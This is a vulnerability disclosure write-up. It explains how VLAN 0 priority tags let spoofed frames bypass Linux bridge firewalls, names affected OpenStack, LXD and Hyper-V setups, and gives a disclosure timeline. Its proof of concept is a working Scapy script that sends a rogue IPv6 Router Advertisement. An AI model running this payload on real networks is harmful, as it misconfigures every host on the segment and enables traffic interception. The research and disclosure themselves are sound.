# Bridge firewalling "bypass" using VLAN 0

See follow up article: [Layer 2 network security bypass using VLAN 0, LLC/SNAP headers and invalid length](../VLAN0_LLC_SNAP/README.md)

L2 networks are insecure by default, vulnerable to ARP, DHCP, Router Advertisement spoofing to name a few.
Over the years security mechanisms have been implemented to detect and or stop those attacks.
As usual when you try to filter anything, you MUST use an allow list approach, else you risk letting some unwanted traffic go through.

I was not able to find anything about VLAN 0 attacks, so this might be a novel attack.

The packet syntax in this article is the one used by [Scapy](https://scapy.readthedocs.io/)

## VLAN 0

Many people know that VLAN 1 is special, and that VLAN 0 and 4095 are reserved.
Now to be more precise, VLAN 0, i.e. having `VID` set to `0x000`, "indicates that the frame does not carry a VLAN ID;
in this case, the `802.1Q` tag specifies only a priority (in `PCP` and `DEI` fields) and is referred to as a priority tag" (Wikipedia).

When Linux receives a `802.1Q` packet, it looks up if a VLAN interface with the correct `VID` exists to handle this packet, else it'll be dropped.
For example, a packet with `VID` == 42 would go to `eth0.42`.

Now if `VID` == `0x000`, Linux ignores/removes the VLAN header and handles it on the untagged interface, ie `eth0`.
To be more precise, on raw sockets (tcpdump) you will see the header (always use `tcpdump -e`).
This means that any software that reads packets from raw sockets must take care of ignoring `VID` == `0x000` packets,
and I discovered the hard way trying to make ucarp work, that on some Cisco UCS servers always add a priority tag.

To sum up, using Scapy syntax, both
```
Ether()/IP(dst="192.168.2.1")/ICMP()
Ether()/Dot1Q(vlan=0)/IP(dst="192.168.2.1")/ICMP()
```
will trigger the same response from 192.168.2.1, but for the first packet, `ethertype` is `0x0800` (IPv4), and for the second it's `0x8100` (802.1Q).
Even if semantically they are the same, they are definitely different at L2, and that can be a problem.

Now the good news is that Linux also supports `802.1AD`, and it will remove any number of VLAN 0 headers, so
```
Ether()/Dot1Q(vlan=0)/Dot1AD(vlan=0)/Dot1Q(vlan=0)/IP(dst="192.168.2.1")/ICMP()
```
Will also work

## Linux firewalling and VLAN 0

Linux can do bridge firewalling using:
1. `XDP`
2. `tc`
3. `ebtables`
4. `nftables` `netdev` tables
5. `ip(6)tables` with `br_netfilter` module and `net.bridge.bridge-nf-call-ip(6)tables=1`
6. `nftables` `bridge` tables

In all those cases, the rules apply to the "full" packet, i.e. with the VLAN 0 header, meaning that
```
ip6tables -A FORWARD -p ipv6-icmp -m icmp6 --icmpv6-type 134 -j DROP
```
will block IPv6 Router Advertisements without VLAN 0 only, as `ip6tables` will handle "switched" packets with `ethertype` == `0x86dd` only

Enabling `bridge-nf-filter-vlan-tagged` allows to remove 1 level of VLAN headers, but we can just put 2 levels and be done.

## POC

Launch Scapy
```
ra = Ether()/Dot1Q(vlan=0)/Dot1Q(vlan=0)
ra /= IPv6(dst='ff02::1')
ra /= ICMPv6ND_RA(chlim=64, prf='High', routerlifetime=1800)
ra /= ICMPv6NDOptSrcLLAddr(lladdr=get_if_hwaddr('eth0'))
ra /= ICMPv6NDOptPrefixInfo(prefix="2001:db8:1::", prefixlen=64, validlifetime=1810, preferredlifetime=1800)
sendp(ra)
```
(If it works, it'll misconfigure all devices in the same L2 for 30min, you have been warned)

## Tested Software

- Openstack: Vulnerable when using Neutron ML2 with Linuxbridge driver (iptables bridge firewall + ebtables rules), [public bug report](https://bugs.launchpad.net/neutron/+bug/1884341)
- LXD: Vulnerable when using bridged interfaces (security.*_filtering bypass), [fixed the next day](https://github.com/lxc/lxd/pull/7575)
- Microsoft Hyper-V: [CVE-2020-17040](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-17040)
- VMware ESXi: no DHCP snooping / RA guard by default, so nothing to bypass ;)
- Libvirt: nwfilter predefined rules take an allow list approach, so this is safe.

I don't have any managed switch with RA guard to play with.

## Timeline

* 2020-06-19: Initial report to OpenStack, based on code review only
* 2020-06-22: Initial report to LXD
* 2020-06-23: LXD fixed in master (allow ARP/IP/IP6 and drop everything else)
* 2020-07-01: LXD 4.3 released
* 2020-07-01: Initial report to Microsoft
* 2020-07-03: After a good amount of back and forth, OpenStack team confirm the issue
* 2020-08-17: Microsoft tell me that they plan to release a fix on November 10th
* 2020-08-20: OpenStack issue is made public
* 2020-08-20: Sent an [email](https://lore.kernel.org/netdev/CAOdf3grDKBkYmt54ZAzG1zZ6zz1JXeoHSv67_Fc9-nRiY662mQ@mail.gmail.com/) to netdev mailing list to hopefully get feedback on the issue
* 2020-10-07: Microsoft attributes a pretty generous bounty for this report
* 2020-11-10: Microsoft release fixes

## Acknowledgments

- Thanks to OpenStack team for their patience testing my theory
- Thanks to LXD for their speedy fix
- Thanks to Microsoft for their generous bounty
